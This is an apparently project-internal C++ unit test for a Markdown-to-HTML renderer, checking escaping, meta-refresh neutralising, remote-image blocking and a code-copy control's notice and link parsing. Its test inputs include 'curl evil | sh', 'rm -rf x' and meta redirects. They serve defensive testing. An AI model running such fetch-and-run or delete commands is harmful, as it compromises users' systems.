// SPDX-FileCopyrightText: 2026 Open Salamander Authors
// SPDX-License-Identifier: GPL-2.0-or-later
//
// Standalone unit test for the mdview Markdown->HTML generator (htmlgen.cpp +
// md4c). Engine-independent: exercises the pure transformation without
// WebView2. Build via specs/021-mdview-html-renderer/quickstart.md.
//
// Asserts structural properties of the generated HTML across the feature's
// user stories (tables/alignment, code+lang, slugs, raw-HTML pass-through,
// text escaping / XSS boundary, local image rewrite, remote-image block).

#include <windows.h>
#include <string>
#include <cstdio>
#include "render.h"
#include "htmlgen.h"

static int g_pass = 0, g_fail = 0;

static void Check(const char* name, bool cond)
{
    printf(cond ? "  [PASS] %s\n" : "  [FAIL] %s\n", name);
    if (cond) g_pass++; else g_fail++;
}

static bool Has(const std::string& hay, const char* needle)
{
    return hay.find(needle) != std::string::npos;
}

static std::string Gen(const std::string& md, const std::wstring& docDir = L"C:\\docs",
                       const std::wstring& find = L"", bool allowRemote = false,
                       MdHtmlResult* keep = nullptr)
{
    const MdTheme* t = MdThemeById("paper");
    MdHtmlResult local;
    MdHtmlResult& r = keep ? *keep : local;
    MdRenderHtml(md, *t, docDir, r, find, allowRemote);
    return r.html;
}

int main()
{
    // US1: GFM table with column alignment
    {
        std::string h = Gen("| A | B | C |\n|:--|:-:|--:|\n| 1 | 2 | 3 |\n");
        Check("table renders as grid", Has(h, "<table>") && Has(h, "<th"));
        Check("table left align", Has(h, "text-align:left"));
        Check("table center align", Has(h, "text-align:center"));
        Check("table right align", Has(h, "text-align:right"));
    }
    // US1: heading slug
    {
        std::string h = Gen("# Hello World\n");
        Check("heading has slug id", Has(h, "id=\"hello-world\""));
        Check("heading tag", Has(h, "<h1"));
    }
    // US1: fenced code block with language + highlight class hooks
    {
        std::string h = Gen("```c\nint x = 42;\n```\n");
        Check("code block emitted", Has(h, "<pre><code"));
        Check("code language class", Has(h, "language-c"));
    }
    // US1: lists + task list
    {
        std::string h = Gen("- a\n- b\n\n1. one\n2. two\n\n- [x] done\n- [ ] todo\n");
        Check("unordered list", Has(h, "<ul>"));
        Check("ordered list", Has(h, "<ol>"));
        Check("task checkbox", Has(h, "type=\"checkbox\"") && Has(h, "checked"));
    }
    // US2 / escaping: literal '<' in text must be escaped (XSS boundary)
    {
        std::string h = Gen("a < b and c > d & e\n");
        Check("text '<' escaped", Has(h, "&lt;"));
        Check("text '&' escaped", Has(h, "&amp;"));
    }
    // US4: embedded raw HTML rendered verbatim (safety is the engine lockdown)
    {
        std::string h = Gen("Press <kbd>Esc</kbd> to close.\n");
        Check("inline raw HTML passed through", Has(h, "<kbd>Esc</kbd>"));
    }
    // US4 + US2: a raw HTML <script> block is passed through verbatim by the
    // generator (NOT sanitized); inertness is enforced by the WebView2 lockdown.
    {
        std::string h = Gen("<script>window.x=1</script>\n");
        Check("raw <script> block passed through (inert at engine)", Has(h, "<script>window.x=1</script>"));
        // and it is NOT executed here (pure string) - documented design
    }
    // feature 085 (F3): a document cannot navigate by itself - the http-equiv
    // attribute of raw HTML is renamed, everything else stays verbatim
    {
        std::string h = Gen("<meta http-equiv=\"refresh\" content=\"1; url=https://example.com/\">\n\ntext\n");
        Check("085 block meta refresh neutralised", !Has(h, "http-equiv") && Has(h, "data-tc-equiv=\"refresh\""));
        Check("085 rest of the tag kept", Has(h, "content=\"1; url=https://example.com/\""));
        h = Gen("x <meta HTTP-EQUIV = 'Refresh' content='0;url=a.md'> y\n");
        Check("085 inline, case and spaces", !Has(h, "HTTP-EQUIV") && Has(h, "data-tc-equiv = 'Refresh'"));
        // review 2 (REJECT): the '=' on the next line, or after a form feed
        h = Gen("<div>\n<meta http-equiv\n=\"refresh\" content=\"1;url=https://tracker/\">\n</div>\n");
        Check("085 block, '=' on the next line", !Has(h, "http-equiv") && Has(h, "data-tc-equiv"));
        h = Gen("x <meta http-equiv\n=\"refresh\" content=\"1;url=https://x\"> y\n");
        Check("085 inline, '=' on the next line", !Has(h, "http-equiv") && Has(h, "data-tc-equiv"));
        h = Gen("<meta http-equiv\f=\"refresh\" content=\"1;url=https://x\">\n");
        Check("085 form feed before '='", !Has(h, "http-equiv") && Has(h, "data-tc-equiv"));
        // outside a block md4c does not take these as HTML (escaped, inert); inside
        // a <div> block they are raw, and a browser reads the attribute
        h = Gen("<div>\n<meta content=\"1;url=https://x\"http-equiv=refresh>\n<meta/http-equiv=refresh>\n</div>\n");
        Check("085 after a quote or '/' (raw in a block)", !Has(h, "http-equiv") && Has(h, "<meta/data-tc-equiv=refresh>"));
        h = Gen("<p>the http-equiv attribute</p>\n");
        Check("085 prose in raw HTML untouched", Has(h, "the http-equiv attribute"));
        h = Gen("The `http-equiv=refresh` trick, and http-equiv=\"refresh\" in text.\n");
        Check("085 Markdown text untouched", Has(h, "http-equiv=refresh") && !Has(h, "data-tc-equiv"));
    }
    // US3: local relative image is rewritten to the interceptor origin
    {
        MdHtmlResult r;
        std::string h = Gen("![alt](pic.png)\n", L"C:\\docs", L"", false, &r);
        Check("local image rewritten", Has(h, "https://mdview.invalid/img/0"));
        Check("local image recorded", r.images.size() == 1 && r.images[0].kind == MdImageRef::Local);
    }
    // US3: remote image blocked by default (placeholder, not fetched)
    {
        MdHtmlResult r;
        std::string h = Gen("![x](http://example.com/x.png)\n", L"C:\\docs", L"", false, &r);
        Check("remote image blocked -> placeholder", Has(h, "md-imgph"));
        Check("remote image not listed (no fetch)", r.images.empty());
        Check("remote image no <img src=http", !Has(h, "src=\"http://example.com"));
    }
    // US3: with consent, remote image becomes servable
    {
        MdHtmlResult r;
        std::string h = Gen("![x](http://example.com/x.png)\n", L"C:\\docs", L"", true, &r);
        Check("remote image with consent -> servable", Has(h, "https://mdview.invalid/img/0") &&
                                                            r.images.size() == 1 &&
                                                            r.images[0].kind == MdImageRef::Remote);
    }
    // US5: script-free find marks matches
    {
        MdHtmlResult r;
        std::string h = Gen("alpha beta alpha gamma alpha\n", L"C:\\docs", L"alpha", false, &r);
        Check("find marks emitted", Has(h, "<mark id=\"mdfind-0\">") && r.matchCount == 3);
    }
    // document wrapper + theme CSS present
    {
        std::string h = Gen("hi\n");
        Check("doctype + article wrapper", Has(h, "<!doctype html>") && Has(h, "markdown-body"));
        Check("theme CSS variables", Has(h, "--bg:") && Has(h, ".hl-kw"));
        Check("reading measure", Has(h, "max-width:46rem"));
    }
    // US4: View Source mode — raw text escaped in <pre>, NOT parsed as Markdown
    {
        const MdTheme* t = MdThemeById("paper");
        MdHtmlResult r;
        MdBuildSourceHtml("# Heading\n<b>x</b>\n", *t, r, L"");
        Check("source in <pre>", Has(r.html, "<pre class=\"mdsource\">"));
        Check("source not parsed (literal #, no <h1>)", Has(r.html, "# Heading") && !Has(r.html, "<h1"));
        Check("source escapes embedded HTML", Has(r.html, "&lt;b&gt;x&lt;/b&gt;"));
    }
    // US3: find works in source view too
    {
        const MdTheme* t = MdThemeById("paper");
        MdHtmlResult r;
        MdBuildSourceHtml("foo bar foo baz\n", *t, r, L"foo");
        Check("source find marks", Has(r.html, "<mark id=\"mdfind-0\">") && r.matchCount == 2);
    }
    // feature 314: page width levels
    {
        const MdTheme* t = MdThemeById("paper");
        auto render = [&](int w)
        {
            MdHtmlResult r;
            MdRenderHtml("hi\n", *t, L"C:\\docs", r, L"", false, w);
            return r.html;
        };
        // the default is the article tag of before 314, exactly, with no width class
        std::string def = Gen("hi\n");
        Check("314 default tag unchanged", Has(def, "<body><article class=\"markdown-body\">\n<p>hi"));
        Check("314 default has no width class",
              !Has(def, "markdown-body wide") && !Has(def, "markdown-body wider") && !Has(def, "markdown-body full"));
        Check("314 NORMAL == default", render(MDPW_NORMAL) == def);
        Check("314 CSS keeps 46rem and padding", Has(def, ".markdown-body{max-width:46rem;margin:0 auto;padding:24px 28px 64px;}"));
        Check("314 CSS level rules", Has(def, ".markdown-body.wide{max-width:64rem;}") &&
                                         Has(def, ".markdown-body.wider{max-width:90rem;}") &&
                                         Has(def, ".markdown-body.full{max-width:none;}"));
        Check("314 CSS tables/images follow the column",
              Has(def, "display:block;overflow-x:auto;max-width:100%;") && Has(def, "img{max-width:100%;"));
        Check("314 WIDE class", Has(render(MDPW_WIDE), "<article class=\"markdown-body wide\">"));
        Check("314 WIDER class", Has(render(MDPW_WIDER), "<article class=\"markdown-body wider\">"));
        Check("314 FULL class", Has(render(MDPW_FULL), "<article class=\"markdown-body full\">"));
        // negative control: the levels really differ from each other and from the default
        Check("314 levels differ", render(MDPW_WIDE) != def && render(MDPW_WIDER) != render(MDPW_WIDE) &&
                                       render(MDPW_FULL) != render(MDPW_WIDER));
        Check("314 out-of-range level -> default", render(4) == def && render(-1) == def && render(1000) == def);
        Check("314 stored 0..3 kept", MdPageWidthFromStored(0) == MDPW_NORMAL && MdPageWidthFromStored(1) == MDPW_WIDE &&
                                          MdPageWidthFromStored(2) == MDPW_WIDER && MdPageWidthFromStored(3) == MDPW_FULL);
        Check("314 stored unknown -> NORMAL", MdPageWidthFromStored(4) == MDPW_NORMAL && MdPageWidthFromStored(7) == MDPW_NORMAL &&
                                                  MdPageWidthFromStored(0xFFFFFFFFu) == MDPW_NORMAL &&
                                                  MdPageWidthFromStored(0x80000000u) == MDPW_NORMAL);
        MdHtmlResult s, s0;
        MdBuildSourceHtml("x\n", *t, s, L"", MDPW_FULL);
        MdBuildSourceHtml("x\n", *t, s0, L"");
        Check("314 source view carries the level", Has(s.html, "<article class=\"markdown-body full\">\n<pre class=\"mdsource\">"));
        Check("314 source view default unchanged", Has(s0.html, "<body><article class=\"markdown-body\">\n<pre class=\"mdsource\">"));
    }

    // feature 408: the copy control of a code block
    {
        const MdTheme* t = MdThemeById("paper");
        MdCopyUi ui;
        ui.base = "https://mdcopy.invalid/0123456789abcdef0123456789abcdef-7/";
        ui.label = "Copy <&>";
        ui.tooltip = "Copy \"the\" code";
        auto render = [&](const std::string& md, const MdCopyUi* u, MdHtmlResult& r)
        {
            MdRenderHtml(md, *t, L"C:\\docs", r, L"", false, MDPW_NORMAL, u);
            return r.html;
        };
        auto count = [](const std::string& h, const char* needle)
        {
            size_t n = 0, p = 0;
            while ((p = h.find(needle, p)) != std::string::npos) { n++; p++; }
            return n;
        };
        const std::string md =
            "```c\nint a;\nint b;\n```\n\n"            // 0 fenced with a language
            "```\nplain \xC4\x8D\xF0\x9F\x98\x80\n```\n\n" // 1 fenced without, non-ASCII
            "    indented();\n    second\n\n"           // 2 indented
            "- item\n\n  ```\n  in list\n  ```\n\n"     // 3 in a list
            "> ```\n> in quote\n> ```\n\n"              // 4 in a quote
            "```\n```\n\n"                              // 5 empty
            "text with `inline code` only\n";
        MdHtmlResult r;
        std::string h = render(md, &ui, r);
        Check("408 one control per code block", count(h, "<a class=\"tc-copy\"") == 6 && r.codeBlocks.size() == 6);
        Check("408 no control for inline code", count(h, "<div class=\"tc-code\">") == 6);
        Check("408 control links base + n", Has(h, "href=\"https://mdcopy.invalid/0123456789abcdef0123456789abcdef-7/0\"") &&
                                                 Has(h, "href=\"https://mdcopy.invalid/0123456789abcdef0123456789abcdef-7/5\""));
        Check("408 wrapper holds the control and the block",
              Has(h, "<div class=\"tc-code\"><a class=\"tc-copy\" href=\"https://mdcopy.invalid/0123456789abcdef0123456789abcdef-7/0\" title=\"Copy &quot;the&quot; code\">Copy &lt;&amp;&gt;</a><pre><code class=\"language-c\">"));
        Check("408 block closes the wrapper", count(h, "</code></pre></div>\n") == 6);
        Check("408 source table: fenced", r.codeBlocks.size() == 6 && r.codeBlocks[0] == "int a;\nint b;\n");
        Check("408 source table: non-ASCII", r.codeBlocks.size() == 6 && r.codeBlocks[1] == "plain \xC4\x8D\xF0\x9F\x98\x80\n");
        Check("408 source table: indented without its indentation", r.codeBlocks.size() == 6 && r.codeBlocks[2] == "indented();\nsecond\n");
        Check("408 source table: list and quote without their markers",
              r.codeBlocks.size() == 6 && r.codeBlocks[3] == "in list\n" && r.codeBlocks[4] == "in quote\n");
        Check("408 source table: empty block", r.codeBlocks.size() == 6 && r.codeBlocks[5].empty());
        Check("408 CSS added once", count(h, ".tc-code:hover .tc-copy") == 1 && count(h, ".tc-code{position:relative;}") == 1);
        Check("408 transparent control still takes a first click or tap (review 1, measured)",
              Has(h, "border-radius:4px;opacity:0;user-select:none;") && Has(h, ".tc-code:hover .tc-copy,.tc-copy:focus{opacity:1;}") &&
                  !Has(h, "pointer-events"));
        Check("408 no in-page notice (the notice is native, review 1)", !Has(h, "tc-copied") && !Has(h, "tc-toast") && Has(h, "only</p>\n\n</article></body></html>"));
        Check("408 CSS uses theme variables only (no fixed colour)",
              h.find("#", h.find(".tc-code{")) > h.find("</style>"));

        // documents of before 408 are unchanged byte for byte
        const std::string plain = "# Title\n\nSome *text* and `code`.\n\n| a | b |\n|---|---|\n| 1 | 2 |\n";
        MdHtmlResult p1, p2;
        Check("408 document without code blocks: identical with the copy UI", render(plain, &ui, p1) == render(plain, nullptr, p2) && p1.codeBlocks.empty());
        MdHtmlResult n1, n2;
        MdCopyUi none = ui;
        none.base.clear();
        std::string noUi = render(md, nullptr, n1);
        Check("408 no copy UI: no control, no CSS, no notice, empty table",
              !Has(noUi, "tc-copy") && !Has(noUi, "tc-toast") && !Has(noUi, "tc-code") && n1.codeBlocks.empty());
        Check("408 empty base == no copy UI", render(md, &none, n2) == noUi && n2.codeBlocks.empty());
        Check("408 no copy UI keeps the block markup of before", Has(noUi, "<pre><code class=\"language-c\">") && count(noUi, "</code></pre>\n") == 6);
        MdHtmlResult again;
        render("```\nx\n```\n", &ui, again);
        Check("408 the table is replaced by each render", again.codeBlocks.size() == 1 && again.codeBlocks[0] == "x\n");
        MdBuildSourceHtml(md, *t, again, L"");
        Check("408 source view: no control, table cleared", !Has(again.html, "tc-copy") && again.codeBlocks.empty());
        MdHtmlResult f;
        MdRenderHtml("```\nfoo\n```\nfoo\n", *t, L"C:\\docs", f, L"copy", false, MDPW_NORMAL, &ui);
        Check("408 find does not mark the control's label", f.matchCount == 0 && f.codeBlocks.size() == 1);

        // review 2 M1: a code line's tabs as the document wrote them
        {
            MdHtmlResult m;
            std::string mh = render("```make\nall:\n\techo hi\n\t\tx\ty\n```\n", &ui, m);
            Check("408 tabs: fenced Makefile keeps its tabs", m.codeBlocks.size() == 1 && m.codeBlocks[0] == "all:\n\techo hi\n\t\tx\ty\n");
            Check("408 tabs: the page still shows md4c's spaces", Has(mh, "    echo hi") && !Has(mh, "\techo"));
            MdHtmlResult ind;
            render("text\n\n\t\tbar\n\t  baz\n", &ui, ind);
            Check("408 tabs: indented block (the first tab is the block's indentation)",
                  ind.codeBlocks.size() == 1 && ind.codeBlocks[0] == "\tbar\n  baz\n");
            MdHtmlResult li;
            render("- item\n\n  ```\n  \tz\n  ```\n", &ui, li);
            Check("408 tabs: in a list", li.codeBlocks.size() == 1 && li.codeBlocks[0] == "\tz\n");
            MdHtmlResult st;
            render("- x\n\n\t\tcode\n", &ui, st);
            Check("408 tabs: a tab straddling the container indentation gives its share as spaces",
                  st.codeBlocks.size() == 1 && st.codeBlocks[0] == "  code\n");
            MdHtmlResult q;
            render(">\t\tq\n", &ui, q);
            Check("408 tabs: in a quote (the marker's tab partly its own)", q.codeBlocks.size() == 1 && q.codeBlocks[0] == "  q\n");
            MdHtmlResult sp;
            render("```\n    four\n  two\n```\n", &ui, sp);
            Check("408 tabs: spaces stay spaces", sp.codeBlocks.size() == 1 && sp.codeBlocks[0] == "    four\n  two\n");
            MdHtmlResult fi;
            render("  ```\n  \tx\n   y\n  ```\n", &ui, fi);
            Check("408 tabs: an indented fence removes its own indentation", fi.codeBlocks.size() == 1 && fi.codeBlocks[0] == "\tx\n y\n");
            MdHtmlResult blankLine;
            render("```\na\n\t\nb\n```\n", &ui, blankLine);
            Check("408 tabs: a whitespace-only line", blankLine.codeBlocks.size() == 1 &&
                                                         (blankLine.codeBlocks[0] == "a\n\t\nb\n" || blankLine.codeBlocks[0] == "a\n    \nb\n"));
        }

        // review 3: invisible lines do not pass for shown lines; no cut inside a combining sequence
        Check("408 notice: invisible-only lines are skipped",
              MdCopyNoticeText(L"C", L"\x2800\x3164\r\n\x200B\xFEFF\r\nreal", 60, 3) == L"C\nreal");
        Check("408 notice: the cut keeps a letter with its combining mark",
              MdCopyNoticeText(L"C", L"abce\x0301z", 4, 3) == L"C\nabc\x2026" && MdCopyNoticeText(L"C", L"abcde\x0301", 4, 3) == L"C\nabcd\x2026");
        Check("408 CSS: the control cannot be dragged", Has(h, "-webkit-user-drag:none;"));
        {
            // review 4 S1: stepping back over a mark must not land inside an emoji
            auto lone = [](const std::wstring& w)
            {
                for (size_t i = 0; i < w.size(); i++)
                {
                    bool hi = w[i] >= 0xD800 && w[i] <= 0xDBFF, lo = w[i] >= 0xDC00 && w[i] <= 0xDFFF;
                    if (hi && (i + 1 >= w.size() || !(w[i + 1] >= 0xDC00 && w[i + 1] <= 0xDFFF)))
                        return true;
                    if (lo && (i == 0 || !(w[i - 1] >= 0xD800 && w[i - 1] <= 0xDBFF)))
                        return true;
                }
                return false;
            };
            std::wstring a1 = MdCopyNoticeText(L"C", L"x\xD835\xDC9C\x0301yz", 3, 3);
            std::wstring a2 = MdCopyNoticeText(L"C", L"\xD83D\xDC68\x200D\xD83D\xDC69", 2, 3);
            std::wstring a3 = MdCopyNoticeText(L"C", L"\xD83D\xDE00\xFE0F", 2, 3);
            std::wstring a4 = MdCopyNoticeText(L"C", std::wstring(58, L'a') + L"\xD83D\xDDD1\xFE0F" + L"tail", 60, 3);
            Check("408 notice: no half emoji before a mark, a joiner or a variation selector",
                  !lone(a1) && !lone(a2) && !lone(a3) && !lone(a4) && a1 == L"C\nx\x2026" && a3 == L"C\n\x2026" &&
                      a4 == L"C\n" + std::wstring(58, L'a') + L"\x2026");
            Check("408 notice: marks of other scripts stay with their letter (Devanagari, Hebrew)",
                  MdCopyNoticeText(L"C", L"ab\x0915\x094Dz", 3, 3) == L"C\nab\x2026" &&
                      MdCopyNoticeText(L"C", L"ab\x05D1\x05BCz", 3, 3) == L"C\nab\x2026");
        }
        {
            // review 3 N5: past the output cap a skipped block was emitted again with the
            // previous block's text (before 408 too)
            MdRenderLimits lim;
            lim.maxNodesText = 300;
            std::string big = "```\nfirst\n```\n\n" + std::string(400, 'x') + "\n\n```\nsecond\n```\n";
            MdHtmlResult c;
            MdRenderHtml(big, *t, L"C:\\docs", c, L"", false, MDPW_NORMAL, &ui, lim);
            Check("408 cap: a block past the cap is not emitted again", c.codeBlocks.size() == 1 && c.codeBlocks[0] == "first\n" &&
                                                                         count(c.html, "<code>first") == 1);
            Check("408 cap: text of skipped blocks does not reach the page (review 4 N4)", !Has(c.html, "second"));
        }

        // the copied text
        Check("408 clip: CR LF, no last line break", MdCodeClipboardText("int a;\nint b;\n") == L"int a;\r\nint b;");
        Check("408 clip: only one last line break dropped", MdCodeClipboardText("a\n\n") == L"a\r\n");
        Check("408 clip: existing CR LF kept", MdCodeClipboardText("a\r\nb\n") == L"a\r\nb");
        Check("408 clip: empty", MdCodeClipboardText("").empty() && MdCodeClipboardText("\n").empty());
        Check("408 clip: non-ASCII", MdCodeClipboardText("plain \xC4\x8D\xF0\x9F\x98\x80\n") == L"plain \x010D\xD83D\xDE00");
        Check("408 clip: NUL dropped (the page shows none)", MdCodeClipboardText(std::string("a\0b\n", 4)) == L"ab");
        {
            // review 1 S2: end to end through md4c, which repeats a NUL in its next text run
            MdHtmlResult z;
            MdRenderHtml(std::string("```\na\0b\n```\n", 12), *t, L"C:\\docs", z, L"", false, MDPW_NORMAL, &ui);
            Check("408 clip: NUL of a real block dropped", z.codeBlocks.size() == 1 && MdCodeClipboardText(z.codeBlocks[0]) == L"ab");
        }

        // the native notice's text
        Check("408 notice: label + the lines", MdCopyNoticeText(L"Copied", L"int a;\r\nint b;", 60, 3) == L"Copied\nint a;\nint b;");
        Check("408 notice: blank lines and indentation skipped", MdCopyNoticeText(L"Copied", L"\r\n   \r\n\t  rm -rf x  \r\nnext", 60, 3) == L"Copied\nrm -rf x\nnext");
        Check("408 notice: empty block", MdCopyNoticeText(L"Copied", L"", 60, 3) == L"Copied" && MdCopyNoticeText(L"Copied", L" \r\n\t", 60, 3) == L"Copied");
        Check("408 notice: long line cut with an ellipsis", MdCopyNoticeText(L"C", L"abcdefghij", 4, 3) == L"C\nabcd\x2026" && MdCopyNoticeText(L"C", L"abcd", 4, 3) == L"C\nabcd");
        Check("408 notice: never half a surrogate pair", MdCopyNoticeText(L"C", L"abc\xD83D\xDE00z", 4, 3) == L"C\nabc\x2026");
        // review 2 S1: a harmless first line no longer hides what follows
        Check("408 notice: more lines than shown end with an ellipsis line",
              MdCopyNoticeText(L"Copied", L"# Welcome\r\n\r\nline 2\r\nline 3\r\ncurl evil | sh", 60, 3) == L"Copied\n# Welcome\nline 2\nline 3\n\x2026" &&
                  MdCopyNoticeText(L"Copied", L"a\r\nb\r\nc\r\n\r\n", 60, 3) == L"Copied\na\nb\nc");
        Check("408 notice: bidi and control characters shown as spaces",
              MdCopyNoticeText(L"C", L"\x202E" L"abc\x202C\x2066" L"d\x2069\x200F" L"e\x0007" L"f", 60, 3) == L"C\nabc  d  e f");
        Check("408 clip: leading line break", MdCodeClipboardText("\nx\n") == L"\r\nx");

        // the address
        const std::wstring base = L"https://mdcopy.invalid/0123456789abcdef0123456789abcdef-7/";
        size_t idx = 99;
        Check("408 link: exact", MdParseCopyLink(base + L"0", base, 6, &idx) == MDCOPY_OK && idx == 0);
        Check("408 link: last index", MdParseCopyLink(base + L"5", base, 6, &idx) == MDCOPY_OK && idx == 5);
        Check("408 link: out of range", MdParseCopyLink(base + L"6", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: wrong token", MdParseCopyLink(L"https://mdcopy.invalid/0123456789abcdef0123456789abcdee-7/0", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: stale serial", MdParseCopyLink(L"https://mdcopy.invalid/0123456789abcdef0123456789abcdef-6/0", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: serial prefix", MdParseCopyLink(L"https://mdcopy.invalid/0123456789abcdef0123456789abcdef-77/0", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: no token", MdParseCopyLink(L"https://mdcopy.invalid//0", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: leading zero", MdParseCopyLink(base + L"01", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: sign", MdParseCopyLink(base + L"+1", base, 6, &idx) == MDCOPY_REFUSED && MdParseCopyLink(base + L"-1", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: empty number", MdParseCopyLink(base, base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: extra path, query, fragment",
              MdParseCopyLink(base + L"1/2", base, 6, &idx) == MDCOPY_REFUSED && MdParseCopyLink(base + L"1?x", base, 6, &idx) == MDCOPY_REFUSED &&
                  MdParseCopyLink(base + L"1#x", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: too many digits", MdParseCopyLink(base + L"1234567890", base, 0xFFFFFFFFu, &idx) == MDCOPY_REFUSED);
        Check("408 link: nine digits", MdParseCopyLink(base + L"123456789", base, 200000000, &idx) == MDCOPY_OK && idx == 123456789);
        Check("408 link: non-ASCII digit", MdParseCopyLink(base + L"\x0661", base, 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: no controls (empty base) refuses the family", MdParseCopyLink(base + L"0", L"", 6, &idx) == MDCOPY_REFUSED);
        Check("408 link: other in-host link is not ours",
              MdParseCopyLink(L"https://mdview.invalid/copy/0", base, 6, &idx) == MDCOPY_NONE &&
                  MdParseCopyLink(L"https://mdview.invalid/notes.md", base, 6, &idx) == MDCOPY_NONE &&
                  MdParseCopyLink(L"https://mdview.invalid/tc-cop", base, 6, &idx) == MDCOPY_NONE &&
                  MdParseCopyLink(L"https://mdview.invalid/tc-copy-notes.md", base, 6, &idx) == MDCOPY_NONE &&
                  MdParseCopyLink(L"https://mdview.invalid/0123456789abcdef0123456789abcdef-7/0", base, 6, &idx) == MDCOPY_NONE);
        Check("408 link: other schemes are not ours",
              MdParseCopyLink(L"https://example.com/tc-copy-x/0", base, 6, &idx) == MDCOPY_NONE &&
                  MdParseCopyLink(L"mailto:a@b", base, 6, &idx) == MDCOPY_NONE && MdParseCopyLink(L"", base, 6, &idx) == MDCOPY_NONE);
        Check("408 link: case matters (the family is lower case)",
              MdParseCopyLink(L"https://MDCOPY.invalid/0123456789abcdef0123456789abcdef-7/0", base, 6, &idx) == MDCOPY_NONE);
    }

    printf("\n=== htmlgen test: %d passed, %d failed ===\n", g_pass, g_fail);
    return g_fail == 0 ? 0 : 1;
}
